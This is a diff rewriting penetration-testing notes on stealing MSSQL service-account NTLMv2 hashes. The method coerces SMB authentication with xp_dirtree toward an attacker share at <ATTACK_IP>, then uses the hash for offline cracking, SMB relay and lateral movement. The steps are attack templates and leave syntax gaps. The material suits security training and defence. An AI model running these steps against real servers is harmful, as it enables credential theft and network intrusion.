@@ -1,59 +1,65 @@
-### **MSSQL: Stealing NTLMv2 Hashes via xp_dirtree**
-
-#### **Overview**
-
-This technique leverages an undocumented MSSQL stored procedure, **xp_dirtree**, to force the MSSQL service account to authenticate against an attacker-controlled share,. This is not a direct exploit of a CVE but a misuse of the **SMB authentication mechanism**.
-
-#### **When to Use**
-
-- When you have **direct interaction** with an MSSQL server or a vulnerable web application.
-- When you need to obtain the **NTLMv2 hash** of the service account running MSSQL for offline cracking or lateral movement,.
+1. Establish direct connection to MSSQL or identify SQL injection in a web application.
+2. Set up a listener (Responder, WireShark, or TCPDump) on `<ATTACK_IP>` to intercept incoming traffic.
+3. Execute `xp_dirtree` targeting a UNC path on the controlled host to trigger the NTLMv2 hash leak.
+4. Capture the hash and decide between local cracking or SMB Relay to secondary targets.
 
 ---
 
-#### **Vulnerability Mechanism: xp_dirtree**
+## Forced NTLMv2 Leak via xp_dirtree
 
-The `xp_dirtree` function is designed to view the contents of a local or remote folder. When the function is directed to a network share, the Windows host automatically attempts to authenticate, sending the service account's **NTLMv2 hash** to the destination.
+**When to use** Direct interaction with MSSQL or SQLi in web applications on Windows hosts where you need to capture the service account hash.
 
-|Parameter|Description|
-|:--|:--|
-|**Folder/Path**|The local or remote (UNC) path to be queried.|
-|**Depth**|Determines how many subfolder levels the function should traverse.|
-|**Target Folder**|The specific directory to be inspected.|
+**Commands** Specify the function and the target network folder to initiate the authentication cycle.
 
----
+```
+xp_dirtree \\<ATTACK_IP>\<SHARE_NAME> <DEPTH>
+```
 
-#### **Attack Implications**
+> ⚠️ **Gap**: Source mentions the function and parameters (depth, target folder) but does not provide the exact T-SQL `EXEC` syntax or specific capture tool flags.
 
-- **Offline Cracking:** Captured NTLMv2 hashes can be cracked to recover the cleartext password.
-- **SMB Relay:** The hash can be "replayed" to log into other network systems where the MSSQL account has **local admin privileges**.
-- **Lateral Movement:** While Microsoft has patched SMB relay back to the originating host, gaining admin access on a different host may allow for further credential harvesting to eventually compromise the original system.
+**Tool comparison**
 
----
+- Responder
+    - Intercepts and displays hashes automatically
+    - Prefer for standard NTLMv2 capture and parsing
+- WireShark / TCPDump
+    - Captures raw traffic for manual analysis
+    - Prefer when automated tools fail or detailed packet inspection is required
 
-#### **Operational Workflow**
+**Dangerous / misconfigured settings**
 
-1. **Preparation:** Start a capture tool on the attack machine to intercept incoming SMB authentication attempts.
-2. **Execution:** Call the `xp_dirtree` function via a direct SQL connection or a vulnerable web application, specifying the attack machine as the destination,.
-3. **Authentication:** The MSSQL service executes the command with **elevated privileges**, sending the authentication hash to the SMB service on the attacker's host.
-4. **Interception:** Use a protocol analyzer or specialized tool to capture and display the hash.
+- MSSQL service running with **elevated privileges** allows system command execution.
+- MSSQL server configured to allow undocumented functions like `xp_dirtree`.
 
----
+**Gotchas** **SMB Relay to the originating host is patched**; the captured hash must be used against other systems where the account has **local admin privileges**.
 
-#### **Command and Tool Reference**
+## NTLMv2 Hash Exploitation
 
-|Category|Tool / Component|Role in Attack|
-|:--|:--|:--|
-|**Source**|MSSQL User Input|Specifies the `xp_dirtree` function and the remote attacker share.|
-|**Process**|MSSQL Service|Executes the command and queries the specified folder.|
-|**Interception**|`Responder`|Intercepts and displays the NTLMv2 hash.|
-|**Interception**|`Wireshark` / `TCPDump`|Captures the network traffic containing the hash for analysis.|
-|**Destination**|SMB Service|The attacker-controlled host where authentication is directed.|
+**When to use** NTLMv2 hash successfully intercepted from the MSSQL service user.
 
-**Note on Command Execution:** Beyond `xp_dirtree`, other methods for executing commands within MSSQL include running **Python code** directly in a SQL query, though these require specific configurations discussed in other modules.
+**Commands** Replay the hash to secondary systems for administrative access.
 
----
+```
+<SMB_RELAY_TOOL> -t <TARGET_IP>
+```
 
-#### **Required Privileges**
+> ⚠️ **Gap**: Source mentions the concept of SMB Relay and cracking but provides no specific tool syntax or cracking commands.
 
-- Executing system-level commands like `xp_dirtree` requires the MSSQL service to run with **elevated privileges**.
+**Edge cases**
+
+- If SMB Relay targets lack **local admin privileges**, the attack will fail to grant system access.
+- If the password is high-entropy, **cracking on the local system** may be unsuccessful.
+
+**Gotchas** **Successful SMB Relay does not guarantee access to the original host**; use gained access on secondary hosts to pivot or steal credentials for the original system.
+
+## Alternative Command Execution
+
+**When to use** Direct command execution is required and `xp_dirtree` is insufficient.
+
+**Commands** Execute Python code within a SQL query if the environment supports it.
+
+```
+<SQL_QUERY_WITH_PYTHON_CODE>
+```
+
+> ⚠️ **Gap**: Source identifies Python execution as an alternative method but provides no syntax or configuration requirements.
